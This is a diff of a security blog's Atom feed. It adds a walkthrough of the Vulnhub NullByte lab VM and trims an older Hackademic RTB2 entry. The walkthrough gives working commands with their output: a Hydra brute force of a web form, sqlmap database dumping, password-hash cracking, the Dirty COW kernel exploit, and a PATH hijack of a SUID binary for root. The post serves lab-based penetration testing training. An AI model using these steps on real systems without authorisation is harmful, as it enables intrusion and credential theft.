@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-04-13T14:03:59-04:00</updated>
+  <updated>2017-04-19T07:43:14-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,404 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - NullByte]]></title>
+    <link href="http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte/"/>
+    <updated>2017-04-18T11:00:06-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte</id>
+    <content type="html"><![CDATA[<p>Today I&rsquo;m back with another vulnerable machine from Vulnhub! It&rsquo;s' been a while since I&rsquo;ve done one, and I was getting restless :D The target for today is called NullByte, and the goal is to read /root/proof.txt</p>
+
+<!-- more -->
+
+
+<p>I am going to use alternate tools to accomplish the enumeration tasks, instead of the usual Nmap ping scan. To identify the machine on the network, I&rsquo;ll go with <strong>netdiscover</strong> this time:</p>
+
+<p>``` plain
+netdiscover -r 192.168.217.0/24</p>
+
+<p> Currently scanning: Finished!   |   Screen View: Unique Hosts</p>
+
+<p> 29 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1740</p>
+
+<hr />
+
+<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>
+
+<hr />
+
+<p> &hellip;          <br/>
+ 192.168.217.135 00:0c:29:57:bc:ff      4     240  Unknown vendor            <br/>
+ &hellip;<br/>
+```</p>
+
+<p>By correlating the VMware MAC address with the one in the scan, I know the IP of the target is 192.168.217.135. Next, I port scanned the target:</p>
+
+<p>``` plain
+nmap -T4 -p- -sV 192.168.217.135</p>
+
+<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-04-18 11:51 EDT
+Nmap scan report for 192.168.217.135
+Host is up, received arp-response (0.00016s latency).
+Not shown: 65531 closed ports
+Some closed ports may be reported as filtered due to &mdash;defeat-rst-ratelimit
+Reason: 65531 resets
+PORT      STATE SERVICE REASON         VERSION
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
+111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
+777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+53755/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
+```</p>
+
+<p>Hmm, SSH on port 777? Oh well, let&rsquo;s look at the web server first:</p>
+
+<p><img class="center" src="/images/pentest/nullbyte/web.png" title="&lsquo;nullbyte web&rsquo; &lsquo;nullbyte web page&rsquo;" ></p>
+
+<p>Just an image, nothing in the source, no robots.txt. I needed to see if there are any other interesting directories, but instead of Dirbuster, I used TheColonial&rsquo;s <a href="https://github.com/OJ/gobuster">Gobuster</a>, which is a CLI tool written in Go:</p>
+
+<p>``` plain
+gobuster -u <a href="http://192.168.217.135/">http://192.168.217.135/</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>
+
+<h1>Gobuster v1.2                OJ Reeves (@TheColonial)</h1>
+
+<p>[+] Mode         : dir
+[+] Url/Domain   : <a href="http://192.168.217.135/">http://192.168.217.135/</a>
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>
+
+<h1>[+] Status codes : 200,204,301,302,307</h1>
+
+<p>/uploads (Status: 301)
+/javascript (Status: 301)</p>
+
+<h1>/phpmyadmin (Status: 301)</h1>
+
+<p>```</p>
+
+<p>Unfortunately, nothing in there either. The only thing that we have so far is an image. Let&rsquo;s hope there is no (or very rudimentary) steganography involved. I looked at the metadata of the image:</p>
+
+<p><code>plain
+exiftool main.gif
+ExifTool Version Number         : 10.40
+File Name                       : main.gif
+Directory                       : .
+File Size                       : 16 kB
+File Modification Date/Time     : 2017:04:18 12:24:59-04:00
+File Access Date/Time           : 2017:04:18 12:24:59-04:00
+File Inode Change Date/Time     : 2017:04:18 12:24:59-04:00
+File Permissions                : rw-r--r--
+File Type                       : GIF
+File Type Extension             : gif
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : 235
+Image Height                    : 302
+Has Color Map                   : No
+Color Resolution Depth          : 8
+Bits Per Pixel                  : 1
+Background Color                : 0
+Comment                         : P-): kzMb5nVYJw
+Image Size                      : 235x302
+Megapixels                      : 0.071
+</code></p>
+
+<p>Hello there, conspicuous comment section! On a hunch, I tried navigating to a folder with that name on the web server, and finally seeing something promising:</p>
+
+<p><img class="center" src="/images/pentest/nullbyte/key.png" title="&lsquo;key&rsquo; &lsquo;key form&rsquo;" ></p>
+
+<p>And in the source, there is a comment stating that &ldquo;this form isn&rsquo;t connected to mysql, password ain&rsquo;t that complex&rdquo;. Ok, so no SQLi then. I took the hint and set to brute forcing the password. I used Hydra for this, so I had to take note of the form parameters:</p>
+
+<p>``` html</p>
+
+<center>
+<form method="post" action="index.php">
+Key:<br>
+<input type="password" name="key">
+</form>
+</center>
+
+
+<p>```</p>
+
+<p>Also, trying the wrong key gives the message invalid key. Armed with this info, I constructed the Hydra query:</p>
+
+<p><code>plain
+hydra 192.168.217.135 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l meh -P /usr/share/dict/words -t 10 -w 10
+</code>
+This looks ugly, so let me break it into pieces:
+* 192.168.217.135 = target name
+* http-form-post = the method used
+* &ldquo;/kzMb5nVYJw/index.php&rdquo; = URL
+* key=^PASS^:invalid key" = the form parameter is called key, the PASS variable will be replaced with passwords from the password file, and Hydra will see as successful a response that doesn&rsquo;t contain the string &ldquo;invalid key&rdquo;
+* -l meh = you have to specify a username for Hydra to work, even though in this case there was no user, so I put something random
+* -P /usr/share/dict/words = password File
+* -t 10 = number of Threads
+* -w 10 = timeout value</p>
+
+<p>``` plain
+Hydra v8.3 &copy; 2016 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>
+
+<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-04-18 13:11:54
+[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
+[DATA] attacking service http-post-form on port 80
+[STATUS] 1170.00 tries/min, 1170 tries in 00:01h, 98001 to do in 01:24h, 10 active
+[STATUS] 1173.33 tries/min, 3520 tries in 00:03h, 95651 to do in 01:22h, 10 active
+[STATUS] 1173.86 tries/min, 8217 tries in 00:07h, 90954 to do in 01:18h, 10 active
+[STATUS] 1174.00 tries/min, 17610 tries in 00:15h, 81561 to do in 01:10h, 10 active
+[STATUS] 1174.32 tries/min, 36404 tries in 00:31h, 62767 to do in 00:54h, 10 active
+[80][http-post-form] host: 192.168.217.135   login: meh   password: elite
+1 of 1 target successfully completed, 1 valid password found
+Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2017-04-18 13:45:57
+```</p>
+
+<p>We can see that Hydra found the password: elite ! Inputting it takes us to another form:</p>
+
+<p><img class="center" src="/images/pentest/nullbyte/username.png" title="&lsquo;username&rsquo; &lsquo;search username&rsquo;" ></p>
+
+<p>Whatever I entered into the form, I got the message &ldquo;Fetched data successfully&rdquo;. I looked at the source code and found another page to check:</p>
+
+<p>``` html</p>
+
+<p>Search for usernames: </p>
+
+
+<hr>
+
+
+<p><form action="420search.php" method="get">
+Enter username:<br>
+<input type="text" name="usrtosearch">
+</form>
+```</p>
+
+<p>Navigating to 420search.php revealed 2 usernames:</p>
+
+<p>``` plain
+EMP ID :1
+EMP NAME : ramses</p>
+
+<h2>EMP POSITION :</h2>
+
+<p>EMP ID :2
+EMP NAME : isis</p>
+
+<h2>EMP POSITION : employee</h2>
+
+<p>Fetched data successfully
+```
+I pointed sqlmap to the usrtosearch parameter and was able to pull data from the DB:</p>
+
+<p><code>plain
+sqlmap -u "http://192.168.217.135/kzMb5nVYJw/420search.php?usrtosearch=isis" -p usrtosearch --dbms=MySQL --tables
+...
+[04:24:25] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, phpmyadmin, seth'
+...
+Database: seth
+[1 table]
++----------------------------------------------+
+| users                                        |
++----------------------------------------------+
+...
+</code></p>
+
+<p>Next I enumerated the users table in the seth DB, and I got a password for ramses:</p>
+
+<p><img class="center" src="/images/pentest/nullbyte/users.png" title="&lsquo;users&rsquo; &lsquo;users csv&rsquo;" ></p>
+
+<p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>
+
+<p>``` plain
+ssh -p 777 <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#114;&#97;&#x6d;&#115;&#101;&#115;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#49;&#55;&#x2e;&#x31;&#x33;&#x35;">&#x72;&#97;&#109;&#115;&#x65;&#115;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x32;&#49;&#x37;&#46;&#x31;&#51;&#x35;</a>
+<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#114;&#x61;&#x6d;&#115;&#101;&#x73;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x32;&#x31;&#x37;&#x2e;&#49;&#x33;&#53;">&#114;&#x61;&#x6d;&#x73;&#x65;&#115;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#50;&#x31;&#55;&#x2e;&#49;&#x33;&#53;</a>&rsquo;s password:</p>
+
+<p>The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.</p>
+
+<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
+ramses@NullByte:~$
+```</p>
+
+<p>Time to look around the system!</p>
+
+<p><code>plain
+ls -l /home
+total 12
+drwxr-xr-x 2 bob    bob    4096 Aug  2  2015 bob
+drwxr-xr-x 2 eric   eric   4096 Aug  2  2015 eric
+drwxr-xr-x 2 ramses ramses 4096 Aug  2  2015 ramses
+</code></p>
+
+<p>Nothing interesting in those home directories. I looked at the kernel version next:</p>
+
+<p>``` plain
+uname -v</p>
+
+<h1>1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)</h1>
+
+<p>```</p>
+
+<p>A bit of google-fu revealed that this kernel is vulnerable to CVE-2016-5195, or more popularly known as the <a href="https://www.exploit-db.com/exploits/40616/">Dirty Cow exploit</a> . It is possible to exploit a race condition to escalate privileges to root! I downloaded the source code to the NullByte VM, commented out the x64 payload and uncommented the x86 one, and then I compiled it with <code>gcc dirtycow.c -o dirtycow -pthread</code>. I got some warnings, but was able to run it successfully:</p>
+
+<p><code>plain
+./dirtycow
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 53112
+Racing, this may take a while..
+thread stopped
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+thread stopped
+root@NullByte:/home/ramses# whoami
+root
+</code></p>
+
+<p>The system crashed shortly afterwards, so I followed the advice in the exploit source code and did <code>echo 0 > /proc/sys/vm/dirty_writeback_centisecs</code>, and it didn&rsquo;t crash anymore. With this, I was able to read the flag:</p>
+
+<p>``` plain
+cat /root/proof.txt
+adf11c7a9e6523e630aaf3b9b7acb51d</p>
+
+<p>It seems that you have pwned the box, congrats.
+Now you done that I wanna talk with you. Write a walk &amp; mail at
+<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#120;&#108;&#121;&#x30;&#x6e;&#x40;&#x73;&#x69;&#x67;&#97;&#x69;&#x6e;&#x74;&#46;&#x6f;&#114;&#x67;">&#x78;&#x6c;&#x79;&#48;&#110;&#x40;&#115;&#105;&#103;&#x61;&#105;&#x6e;&#x74;&#x2e;&#111;&#114;&#x67;</a> attach the walk and proof.txt
+If sigaint.org is down you may mail at <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#110;&#98;&#115;&#x6c;&#121;&#x30;&#110;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#109;">&#x6e;&#98;&#x73;&#108;&#121;&#x30;&#110;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#109;</a></p>
+
+<p>USE THIS PGP PUBLIC KEY</p>
+
+<p>&mdash;&mdash;-BEGIN PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
+Version: BCPG C# v1.6.1.0</p>
+
+<p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
+Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
+e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
+Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
++z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
+YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
+Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
+HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
+m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
+XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
+kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
+TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
+Gms=
+=PiAQ
+&mdash;&mdash;-END PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
+```</p>
+
+<p>After completing this and looking at other walkthroughs to see alternate ways of exploitation, I realized that I completely missed the way this VM was supposed to be exploited, so below is the intended way of solving this:</p>
+
+<p>Inside ramses' home folder is a <strong>.bash_history</strong> file that I neglected reading:</p>
+
+<p><code>plain
+sudo -s
+su eric
+exit
+ls
+clear
+cd /var/www
+cd backup/
+ls
+./procwatch
+clear
+sudo -s
+cd /
+ls
+exit
+</code></p>
+
+<p>An interesting path and binary. Let&rsquo;s see it on the filesystem:</p>
+
+<p><code>plain
+ls -l /var/www/backup
+total 12
+-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
+-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
+cat readme.txt
+I have to fix this mess...
+</code></p>
+
+<p>A SUID executable and a comment alluding to a mess..hmm, what could go wrong here..</p>
+
+<p><code>plain
+./procwatch
+  PID TTY          TIME CMD
+ 1535 pts/0    00:00:00 procwatch
+ 1536 pts/0    00:00:00 sh
+ 1537 pts/0    00:00:00 ps
+</code></p>
+
+<p>This looks like the output of the <strong>ps</strong> command. Let&rsquo;s see a normal ps:</p>
+
+<p><code>plain
+ps
+  PID TTY          TIME CMD
+ 1555 pts/0    00:00:00 bash
+ 1605 pts/0    00:00:00 ps
+</code></p>
+
+<p>I played around with the executable, tried passing arguments, but it looks like it just calls ps and nothing else. In the ps manual, I paid attention to this:</p>
+
+<blockquote><p>By default, ps selects all processes with the same effective user ID</p>
+
+<pre><code>   (euid=EUID) as the current user and associated with the same terminal
+   as the invoker.
+</code></pre></blockquote>
+
+<p>So, we can see the succession for a normal ps is bash &ndash;> ps, and for the SUID binary is procwatch &ndash;> sh &ndash;> ps. Maybe we can intercept the call to ps by creating an arbitrary binary called ps and placing it in the PATH variable. And of course, we want a shell!</p>
+
+<p><code>plain
+cp /bin/sh /tmp/ps
+</code></p>
+
+<p>Let&rsquo;s look at the PATH environment variable:</p>
+
+<p><code>plain
+echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>Ok, since I&rsquo;ve placed the fake ps in /tmp, I want to add that to the path:</p>
+
+<p><code>plain
+export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+ramses@NullByte:/var/www/backup$ echo $PATH
+/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>Fingers crossed, running procwatch again:</p>
+
+<p>``` plain
+ramses@NullByte:/var/www/backup$ ./procwatch</p>
+
+<h1>whoami</h1>
+
+<p>root
+```</p>
+
+<p>And we&rsquo;re root..the right way! :D</p>
+
+<p>``` plain
+/ You&rsquo;ll wish that you had done some of \
+| the hard things when they were easier |
+\ to do.                                /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Introduction to Burp Suite]]></title>
@@ -641,9 +1039,9 @@ given company search string. Updates the respective tables with the results.</p>
 [<em>] Netblock: 64.56.197.208/28
 [</em>] Netblock: 67.72.118.0/23
 [<em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-1/pocs">http://whois.arin.net/rest/org/YAHOO-1/pocs</a>
-[</em>] Contact: Netblock Admin (<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x6e;&#x65;&#x74;&#98;&#108;&#111;&#99;&#107;&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x79;&#97;&#x68;&#111;&#111;&#45;&#x69;&#110;&#99;&#46;&#99;&#111;&#x6d;">&#x6e;&#x65;&#x74;&#x62;&#108;&#111;&#99;&#x6b;&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x79;&#x61;&#104;&#111;&#x6f;&#45;&#x69;&#x6e;&#x63;&#46;&#x63;&#x6f;&#109;</a>) &ndash; Whois contact (Admin) (Sunnyvale, CA &ndash; United States)
-[<em>] Contact: Netblock Admin (<a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#110;&#101;&#116;&#98;&#x6c;&#111;&#x63;&#x6b;&#97;&#100;&#109;&#105;&#110;&#x40;&#121;&#x61;&#x68;&#111;&#111;&#45;&#105;&#x6e;&#x63;&#46;&#x63;&#x6f;&#109;">&#110;&#101;&#116;&#98;&#108;&#x6f;&#99;&#107;&#97;&#100;&#109;&#x69;&#110;&#64;&#121;&#97;&#104;&#x6f;&#x6f;&#x2d;&#105;&#x6e;&#99;&#x2e;&#x63;&#x6f;&#109;</a>) &ndash; Whois contact (Tech) (Sunnyvale, CA &ndash; United States)
-[</em>] Contact: Network Abuse (<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#97;&#x62;&#x75;&#115;&#101;&#x40;&#121;&#97;&#x68;&#x6f;&#111;&#x2d;&#x69;&#x6e;&#99;&#46;&#99;&#111;&#x6d;">&#97;&#x62;&#117;&#115;&#101;&#x40;&#121;&#x61;&#x68;&#x6f;&#x6f;&#x2d;&#x69;&#110;&#99;&#46;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Abuse) (Sunnyvale, CA &ndash; United States)</p>
+[</em>] Contact: Netblock Admin (<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#110;&#101;&#x74;&#98;&#x6c;&#111;&#99;&#107;&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#x79;&#97;&#x68;&#111;&#111;&#x2d;&#x69;&#x6e;&#x63;&#x2e;&#99;&#111;&#109;">&#110;&#101;&#116;&#x62;&#108;&#111;&#99;&#107;&#x61;&#x64;&#x6d;&#x69;&#110;&#x40;&#x79;&#x61;&#104;&#111;&#x6f;&#x2d;&#x69;&#x6e;&#x63;&#46;&#99;&#111;&#x6d;</a>) &ndash; Whois contact (Admin) (Sunnyvale, CA &ndash; United States)
+[<em>] Contact: Netblock Admin (<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#110;&#x65;&#116;&#98;&#108;&#x6f;&#x63;&#x6b;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#121;&#97;&#x68;&#x6f;&#x6f;&#x2d;&#x69;&#x6e;&#x63;&#46;&#x63;&#111;&#109;">&#110;&#x65;&#x74;&#98;&#x6c;&#x6f;&#x63;&#107;&#x61;&#100;&#x6d;&#105;&#x6e;&#x40;&#121;&#x61;&#104;&#111;&#x6f;&#45;&#105;&#110;&#x63;&#x2e;&#x63;&#111;&#109;</a>) &ndash; Whois contact (Tech) (Sunnyvale, CA &ndash; United States)
+[</em>] Contact: Network Abuse (<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#97;&#98;&#117;&#x73;&#101;&#x40;&#121;&#x61;&#x68;&#x6f;&#111;&#x2d;&#105;&#110;&#x63;&#x2e;&#99;&#x6f;&#x6d;">&#x61;&#98;&#117;&#115;&#x65;&#x40;&#121;&#97;&#x68;&#111;&#111;&#45;&#105;&#110;&#99;&#46;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Abuse) (Sunnyvale, CA &ndash; United States)</p>
 
 <hr />
 
@@ -653,9 +1051,9 @@ given company search string. Updates the respective tables with the results.</p>
 [</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/nets">http://whois.arin.net/rest/org/YAHOO-10/nets</a>
 [<em>] Netblock: 12.23.247.176/29
 [</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/pocs">http://whois.arin.net/rest/org/YAHOO-10/pocs</a>
-[<em>] Contact: Janice Kilburn (<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#x6b;&#105;&#108;&#x62;&#x75;&#x72;&#x6e;&#x31;&#x73;&#x74;&#x6f;&#x70;&#64;&#121;&#97;&#x68;&#111;&#111;&#x2e;&#99;&#x6f;&#109;">&#106;&#x6b;&#x69;&#108;&#98;&#117;&#x72;&#110;&#49;&#115;&#x74;&#111;&#x70;&#64;&#x79;&#x61;&#x68;&#x6f;&#111;&#46;&#99;&#111;&#x6d;</a>) &ndash; Whois contact (Admin) (Lawrenceburg, TN &ndash; United States)
-[</em>] Contact: Janice Kilburn (<a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#106;&#x6b;&#x69;&#x6c;&#x62;&#x75;&#114;&#110;&#49;&#115;&#x74;&#x6f;&#112;&#64;&#x79;&#x61;&#x68;&#111;&#111;&#x2e;&#99;&#111;&#x6d;">&#x6a;&#107;&#105;&#108;&#x62;&#117;&#x72;&#110;&#x31;&#x73;&#x74;&#111;&#112;&#x40;&#121;&#x61;&#x68;&#111;&#111;&#46;&#99;&#111;&#x6d;</a>) &ndash; Whois contact (Abuse) (Lawrenceburg, TN &ndash; United States)
-[<em>] Contact: Janice Kilburn (<a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x6a;&#x6b;&#x69;&#x6c;&#x62;&#117;&#114;&#x6e;&#x31;&#x73;&#116;&#111;&#x70;&#64;&#x79;&#97;&#x68;&#111;&#111;&#x2e;&#99;&#x6f;&#109;">&#x6a;&#x6b;&#105;&#108;&#x62;&#x75;&#114;&#110;&#49;&#x73;&#116;&#111;&#112;&#64;&#121;&#x61;&#x68;&#x6f;&#x6f;&#46;&#99;&#111;&#x6d;</a>) &ndash; Whois contact (Tech) (Lawrenceburg, TN &ndash; United States)
+[<em>] Contact: Janice Kilburn (<a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#106;&#107;&#x69;&#108;&#x62;&#x75;&#114;&#x6e;&#x31;&#x73;&#116;&#x6f;&#x70;&#x40;&#x79;&#97;&#x68;&#x6f;&#111;&#x2e;&#x63;&#x6f;&#109;">&#x6a;&#x6b;&#105;&#108;&#x62;&#x75;&#x72;&#110;&#49;&#x73;&#116;&#111;&#112;&#x40;&#121;&#x61;&#104;&#111;&#111;&#x2e;&#x63;&#x6f;&#109;</a>) &ndash; Whois contact (Admin) (Lawrenceburg, TN &ndash; United States)
+[</em>] Contact: Janice Kilburn (<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#x6a;&#107;&#105;&#x6c;&#x62;&#x75;&#x72;&#110;&#49;&#x73;&#116;&#111;&#x70;&#64;&#x79;&#x61;&#104;&#x6f;&#x6f;&#46;&#99;&#x6f;&#x6d;">&#106;&#107;&#105;&#x6c;&#98;&#x75;&#114;&#x6e;&#49;&#x73;&#x74;&#x6f;&#112;&#x40;&#121;&#97;&#x68;&#x6f;&#111;&#x2e;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Abuse) (Lawrenceburg, TN &ndash; United States)
+[<em>] Contact: Janice Kilburn (<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#106;&#x6b;&#x69;&#x6c;&#98;&#x75;&#114;&#x6e;&#x31;&#115;&#116;&#111;&#x70;&#64;&#x79;&#97;&#104;&#111;&#x6f;&#x2e;&#x63;&#111;&#109;">&#x6a;&#107;&#x69;&#108;&#x62;&#117;&#x72;&#110;&#49;&#115;&#x74;&#x6f;&#x70;&#64;&#x79;&#97;&#x68;&#x6f;&#111;&#46;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Tech) (Lawrenceburg, TN &ndash; United States)
 [</em>] URL: <a href="http://whois.arin.net/rest/customers;name=yahoo">http://whois.arin.net/rest/customers;name=yahoo</a></p>
 
 <hr />
@@ -1701,221 +2099,6 @@ repositories
 <p>``` plain
 / You have the capacity to learn from \
 \ mistakes. You&rsquo;ll learn a lot today. /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
-    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
-    <updated>2016-07-20T13:36:20-04:00</updated>
-    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
-    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>
-
-<!-- more -->
-
-
-<h1>Recon</h1>
-
-<p>Again, this will be a web hacking mission, only web server is available.</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb2-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>
-
-<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>
-
-<p><code>plain
-nmap -sU -F -n -T4 192.168.80.166
-PORT     STATE SERVICE  REASON
-5353/udp open  zeroconf udp-response ttl 255
-</code></p>
-
-<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>
-
-<p>``` plain
-nmap  -p- 192.168.80.166</p>
-
-<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-07-21 08:14 EDT
-Nmap scan report for 192.168.80.166
-Host is up, received arp-response (0.00024s latency).
-Not shown: 65533 closed ports, 1 filtered port
-Reason: 65533 resets and 1 port-unreach
-PORT   STATE SERVICE REASON
-80/tcp open  http    syn-ack ttl 64
-```</p>
-
-<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>
-
-<p><code>plain
-PORT    STATE SERVICE REASON
-80/tcp  open  http    syn-ack ttl 64
-666/tcp open  doom    syn-ack ttl 64
-</code></p>
-
-<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>
-
-<p><code>plain
-666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))
-</code></p>
-
-<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>
-
-<p><code>plain
